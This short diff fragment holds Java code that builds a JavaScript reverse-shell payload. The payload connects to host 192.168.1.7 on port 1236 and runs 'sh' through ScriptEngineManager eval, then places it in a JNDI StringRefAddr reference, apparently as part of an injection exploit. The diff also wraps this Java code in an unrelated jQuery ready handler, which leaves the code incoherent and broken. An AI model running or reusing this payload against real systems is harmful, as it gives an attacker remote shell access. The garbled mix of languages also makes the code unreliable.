@@ -1,3 +1,4 @@
+jQuery(document).ready(function($) {
 String command = "var host = '192.168.1.7';" +
                        "var port = 1236;" +
                        "var cmd = 'sh';"+
@@ -27,3 +28,4 @@ String command = "var host = '192.168.1.7';" +
                        "s.close();";
 String x = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\""+command+"\")";
 ref.add(new StringRefAddr("x", x);
+});
